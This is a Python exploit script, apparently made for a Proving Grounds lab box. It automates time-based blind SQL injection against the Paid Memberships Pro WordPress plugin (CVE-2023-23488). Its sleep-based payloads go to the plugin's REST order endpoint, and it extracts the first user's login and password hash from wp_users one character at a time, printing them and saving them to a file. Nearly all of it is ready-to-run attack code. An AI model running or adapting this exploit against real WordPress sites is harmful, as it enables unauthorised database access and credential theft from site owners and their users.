#!/usr/bin/env python3 
# 
# python script for automating the blind sql part of the proving ground pipe box.
# writing credentials to pipe-credentials.txt
# CVE-2023-23488 (sqli in wordpress plugin 'Paid Memberships Pro')
# make sure to have added affliation.local to your /etc/hosts
#
# v1.1 dd 23-06-2024    
# authors: Kenny & Baas

import time   
import requests  

URL = 'http://affliation.local'  
PLUGIN = '/?rest_route=/pmpro/v1/order&code='  

print('boolean time based SQLi, be patient. this will take some time... (3,5 minutes) ')  

startTime = time.time()
queries = 0 
check = True 

PASSWORD = ''
USERNAME = ''
COLUMN = ['user_login','user_pass']


for Loop in range(2): 
    result = '' 
    SPOS = 0 
    while check:
        SPOS = SPOS +1 

        SQLI = f'a\'+or+(select+1+from(select+if((ascii(mid((select+{COLUMN[Loop]}+from+wordpress.wp_users+order+by+1+limit+0,1),{str(SPOS)},1))=0),sleep(0.4),0))a)--+-' 
        PAYLOAD = URL+PLUGIN+SQLI  
        start = time.time()   
        REQ = requests.get(PAYLOAD) 
        queries = queries +1 
        end = time.time() 
        if end-start > 1: break 

        
        flag = True 
        teller = 80 
        tArray = [23,11,5,3,2,1] 
        while flag:
            for x in tArray: 
                SQLI = f'a\'+or+(select+1+from(select+if((ascii(mid((select+{COLUMN[Loop]}+from+wordpress.wp_users+order+by+1+limit+0,1),{str(SPOS)},1))>{str(teller)}),sleep(0.4),0))a)--+-'  
                
                PAYLOAD = URL+PLUGIN+SQLI  
                start = time.time()   
                REQ = requests.get(PAYLOAD) 
                queries = queries +1 
                end = time.time() 
                
                if end-start > 1:    
                    teller = teller + x
                else:
                    teller = teller - x

            if x == 1: 
                SQLI = f'a\'+or+(select+1+from(select+if((ascii(mid((select+{COLUMN[Loop]}+from+wordpress.wp_users+order+by+1+limit+0,1),{str(SPOS)},1))={str(teller)}),sleep(0.4),0))a)--+-'  
                
                PAYLOAD = URL+PLUGIN+SQLI  
                start = time.time()   
                REQ = requests.get(PAYLOAD)  
                queries = queries +1
                end = time.time() 

                if end-start > 1: 
                    result += chr(teller)
                else:
                    result += chr(teller + 1)
                break
    if Loop == 1:
        PASSWORD += result
    else:
        USERNAME += result    

endTime = time.time()
print('time elapsed: '+str(round(endTime-startTime,2)))
print('number of sql queries: '+ str(queries))
print('Username: '+ USERNAME)
print('Password: '+ PASSWORD)

if len(PASSWORD) > 1:
    with open('pipe-credentials.txt',"a") as f:
        f.write(str(USERNAME)+' : '+str(PASSWORD)) 

